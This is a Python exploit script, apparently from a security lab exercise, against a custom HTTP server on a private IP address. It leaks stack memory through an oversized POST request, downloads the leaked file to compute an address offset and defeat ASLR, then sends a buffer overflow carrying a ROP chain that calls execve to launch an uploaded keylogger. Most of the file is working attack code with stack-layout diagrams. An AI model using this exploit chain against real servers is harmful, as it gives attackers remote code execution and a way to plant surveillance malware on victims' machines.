'''
[FINDINGS]
Exploit in POST, writes the given data but also everything higher then then adresses on the stack
Example stack:
              handle_client_frame
                |
                <===========================================> 
                <return><======================0x530========>
                    |                    <===POST-PAYLOAD===>
                    |
                    |
                    └> <...rbp,rbx,RAX,RET,rbp,r15,r14,r12,rbx> ---> zie demo.txt
         
    
Looking at handle_client, the 6th address which we push on the stack is the rbp of handle_client
Find address using that data
Use that address to calculate the offset to the adres space of scenario_2
Use that offset to calculate the offset of the ropchain
'''

from keystone import *
from pwn import *
from struct import pack

### CONFIGS ###
host = "192.168.152.130"
port = 8080 
og_handle_address = 0x3720
return_address_offset = 183
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer

### FUNCTIONS ###
def get_handle_address():
    with open('./scenario_4/data.txt', 'rb') as f:
        stack_data = f.read()

    # Translate file data to hex in chuncks of 8 bytes
    hex_pairs = [f'{x:02x}' for x in stack_data]
    hex_segments = []
    for i in range(0, len(hex_pairs), 8):
        segment = hex_pairs[i:i+8][::-1]  
        hex_segments.append(''.join(segment)) 
    
    hex_data = ' '.join(hex_segments)

    # Write to file
    with open('./scenario_4/out.txt', 'w') as f:
        f.write(hex_data)

    # Find the address of the handle function
    return int(hex_data.split(' ')[return_address_offset], 16)

def download_data_file():
    url = f"http://{host}:{port}/data.txt"
    local_path = './scenario_4/data.txt'

    try:
        # Download the file using wget
        wget(url, local_path)

        print(f"File downloaded successfully to {local_path}")

    except Exception as e:
        print(f"Failed to download file. Error: {e}")

### PAYLOAD ###
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"

### CREATE THE POST PAYLOAD ###
text = b"AAAAAAAABCCCCCCC"
post_exploit = b"POST /data.txt HTTP/1.1\r\n"
post_exploit += b"Content-Length: 100000 \r\n"
post_exploit += b"\r\n"  
post_exploit += text

### CREATE THE ROPCHAIN ATTACK  ###
def create_ropchain_attack(handle_address):
    offset = og_handle_address - handle_address
    keylogger_name = b'./keylog'

    p = b''
    p += pack('<Q', 0x000000000000375a - offset) # pop rdx ; pop rax ; ret
    p += pack('<Q', 0x0000000000006230 - offset) # @ .data
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x000000000000375b - offset) # pop rax ; ret
    p += keylogger_name
    p += pack('<Q', 0x0000000000003756 - offset) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', 0x000000000000375a - offset) # pop rdx ; pop rax ; ret
    p += pack('<Q', 0x0000000000006238 - offset) # @ .data + 8
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x000000000000375d - offset) # xor rax, rax ; ret
    p += pack('<Q', 0x0000000000003756 - offset) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', 0x0000000000003a1b - offset) # pop rdi ; ret
    p += pack('<Q', 0x0000000000006230 - offset) # @ .data
    p += pack('<Q', 0x00000000000028bc - offset) # pop rsi ; pop rbp ; ret
    p += pack('<Q', 0x0000000000006238 - offset) # @ .data + 8
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x000000000000375a - offset) # pop rdx ; pop rax ; ret
    p += pack('<Q', 0x0000000000006238 - offset) # @ .data + 8
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x000000000000375d - offset) # xor rax, rax ; ret
    p += pack('<Q', 0x000000000000375b - offset) # pop rax ; ret
    p += pack("<Q", 0x000000000000003b) # syscall number (59) for rax
    p += pack("<Q", 0x000000000000377b - offset) # syscall

    rop_exploit = message_prefix
    padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - message_prefix_len
    rop_exploit += b"q" * padding_size
    rop_exploit += p
    rop_exploit += b"\r\n\r\n"

    return rop_exploit


### PERFORM ATTACK ###
remote(host, port).send(post_exploit)
sleep(3)

download_data_file()
handle_address = get_handle_address()
print("Handle address found : " + hex(handle_address))
rop_exploit = create_ropchain_attack(handle_address)

input("Upload the keylogger. Press any key to continue...")

remote(host, port).send(rop_exploit)




# details for 'payload_rsp_offset':
#
# stack representation after return to the injected shell code:
#
#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
#                                         |            |                         |
#                                         ||<---0x10-->|<---------0x450--------->|
# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
#                          |               |           |<5>|=========<4>=========|
#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
#                                          |                       |<-24->|<-49->|
#                                          |<--payload_rsp_offset->|
#                                                                  └> start of injected payload
# Legend:
#   <1>: caller stack frame
#   <2>: spilled rbp of the caller
#   <3>: log_message stack frame
#   <4>: vulnerable buffer
#   <5>: other local variables   -> 5 VARS so 0x20 big
#   <6>: injected payload
#   <7>: "GET /data.txt HTTP/1.1\r\n"
#   <8>: "== Request from..."

